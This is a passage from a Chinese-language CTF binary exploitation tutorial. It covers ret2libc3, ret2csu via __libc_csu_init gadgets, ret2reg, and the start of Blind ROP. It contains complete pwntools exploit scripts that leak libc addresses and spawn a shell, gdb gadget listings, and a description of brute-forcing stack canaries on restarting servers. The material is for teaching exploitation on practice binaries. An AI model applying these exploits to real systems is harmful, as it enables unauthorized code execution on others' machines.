<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">ret2libc3</a></p>
<p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
<pre><code>➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No surprise anymore, system disappeard QQ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can you find it !?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
<li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li>
</ul>
<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
<ul>
<li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></li>
</ul>
<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>
<p>exp 如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>

ret2libc3 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc3'</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
libc_start_main_got <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
main <span class="token operator">=</span> ret2libc3<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

<span class="token keyword">print</span> <span class="token string">"leak libc_start_main_got addr and return to main again"</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> puts_plt<span class="token punctuation">,</span> main<span class="token punctuation">,</span> libc_start_main_got<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Can you find it !?'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">"get the related addr"</span>
libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> libc_start_main_addr<span class="token punctuation">)</span>
libcbase <span class="token operator">=</span> libc_start_main_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> <span class="token string">"get shell"</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">104</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="中级-ROP"><a href="#中级-ROP" class="headerlink" title="中级 ROP"></a>中级 ROP</h1><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p>
<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
<pre><code>.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp</code></pre><p>这里我们可以利用以下几点</p>
<ul>
<li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>
<li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>
<li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护</p>
<pre><code>➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre><p>程序为 64 位，开启了堆栈不可执行保护。</p>
<p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>
<pre class="line-numbers language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-80h]@1</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简单浏览下程序，发现程序中既没有 system 函数地址，也没有 /bin/sh 字符串，所以两者都需要我们自己去构造了。</p>
<p><strong>注：这里我尝试在我本机使用 system 函数来获取 shell 失败了，应该是环境变量的问题，所以这里使用的是 execve 来获取 shell。</strong></p>
<p>基本利用思路如下</p>
<ul>
<li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li>
<li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li>
<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li>
<li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li>
</ul>
<p>exp 如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher

<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>

level5 <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>

write_got <span class="token operator">=</span> level5<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
read_got <span class="token operator">=</span> level5<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
main_addr <span class="token operator">=</span> level5<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
bss_base <span class="token operator">=</span> level5<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x0000000000400600</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x000000000040061A</span>
fakeebp <span class="token operator">=</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">8</span>


<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">,</span> last<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx,rbp,r12,r13,r14,r15</span>
    <span class="token comment" spellcheck="true"># rbx should be 0,</span>
    <span class="token comment" spellcheck="true"># rbp should be 1,enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function we want to call</span>
    <span class="token comment" spellcheck="true"># rdi=edi=r15d</span>
    <span class="token comment" spellcheck="true"># rsi=r14</span>
    <span class="token comment" spellcheck="true"># rdx=r13</span>
    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x80</span> <span class="token operator">+</span> fakeebp
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>
        r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>last<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span>
<span class="token comment" spellcheck="true">## write(1,write_got,8)</span>
csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> write_got<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> write_got<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>

write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span> write_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
execve_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'execve'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'execve_addr '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">##gdb.attach(sh)</span>

<span class="token comment" spellcheck="true">## read(0,bss_base,16)</span>
<span class="token comment" spellcheck="true">## read execve_addr and /bin/sh\x00</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> read_got<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Hello, World\n'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">## execve(bss_base+8)</span>
csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> bss_base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bss_base <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
<h5 id="改进-1-提前控制-RBX-与-RBP"><a href="#改进-1-提前控制-RBX-与-RBP" class="headerlink" title="改进 1 - 提前控制 RBX 与 RBP"></a>改进 1 - 提前控制 RBX 与 RBP</h5><p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。</p>
<h5 id="改进-2-多次利用"><a href="#改进-2-多次利用" class="headerlink" title="改进 2 - 多次利用"></a>改进 2 - 多次利用</h5><p>其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p>
<ul>
<li>漏洞可以被多次触发</li>
<li>在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。</li>
</ul>
<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>
<h4 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h4><p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
<pre><code>_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini</code></pre><p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
<p>需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器</p>
<ul>
<li>利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。</li>
<li>利用中间部分的代码控制了 rdx，rsi，edi。</li>
</ul>
<p>而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，<strong>可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
<pre><code>gef➤  x/5i 0x000000000040061A
   0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx
   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp
   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12
   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp
   0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12
   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp
   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400624 &lt;__libc_csu_init+100&gt;:  ret
gef➤  x/5i 0x000000000040061e
   0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13
   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400624 &lt;__libc_csu_init+100&gt;:  ret
   0x400625:    nop
gef➤  x/5i 0x000000000040061f
   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp
   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400624 &lt;__libc_csu_init+100&gt;:  ret
   0x400625:    nop
gef➤  x/5i 0x0000000000400620
   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400624 &lt;__libc_csu_init+100&gt;:  ret
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi
   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400624 &lt;__libc_csu_init+100&gt;:  ret
   0x400625:    nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi
   0x400624 &lt;__libc_csu_init+100&gt;:  ret
   0x400625:    nop
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</code></pre><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><ol>
<li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
<li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li>
<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li>
</ol>
<h2 id="JOP"><a href="#JOP" class="headerlink" title="JOP"></a>JOP</h2><p>Jump-oriented programming</p>
<h2 id="COP"><a href="#COP" class="headerlink" title="COP"></a>COP</h2><p>Call-oriented programming</p>
<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 <strong>Hacking Blind</strong>，下面是作者对应的 paper 和 slides, 以及作者相应的介绍</p>
<ul>
<li><a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf" target="_blank" rel="noopener">slide</a></li>
</ul>
<p>BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。</p>
<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ol>
<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
</ol>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>目前，大部分应用都会开启 ASLR、NX、Canary 保护。这里我们分别讲解在 BROP 中如何绕过这些保护，以及如何进行攻击。</p>
<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>在 BROP 中，基本的遵循的思路如下</p>
<ul>
<li>判断栈溢出长度<ul>
<li>暴力枚举</li>
</ul>
</li>
<li>Stack Reading<ul>
<li>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</li>
</ul>
</li>
<li>Blind ROP<ul>
<li>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</li>
</ul>
</li>
<li>Build the exploit<ul>
<li>利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。</li>
</ul>
</li>
</ul>
<h4 id="栈溢出长度"><a href="#栈溢出长度" class="headerlink" title="栈溢出长度"></a>栈溢出长度</h4><p>直接从 1 暴力枚举即可，直到发现程序崩溃。</p>
<h4 id="Stack-Reading"><a href="#Stack-Reading" class="headerlink" title="Stack Reading"></a>Stack Reading</h4><p>如下所示，这是目前经典的栈布局</p>
<pre><code>buffer|canary|saved fame pointer|saved returned address</code></pre><p>要向得到 canary 以及之后的变量，我们需要解决第一个问题，如何得到 overflow 的长度，这个可以通过不断尝试来获取。</p>
<p>其次，关于 canary 以及后面的变量，所采用的的方法一致，这里我们以 canary 为例。</p>
<p>canary 本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。</p>
<p>需要注意的是，攻击条件 2 表明了程序本身并不会因为 crash 有变化，所以每次的 canary 等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有 256 种可能，所以在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/stack_reading.png" alt=""></p>
<h4 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h4><h5 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h5><p>最朴素的执行 write 函数的方法就是构造系统调用。</p>
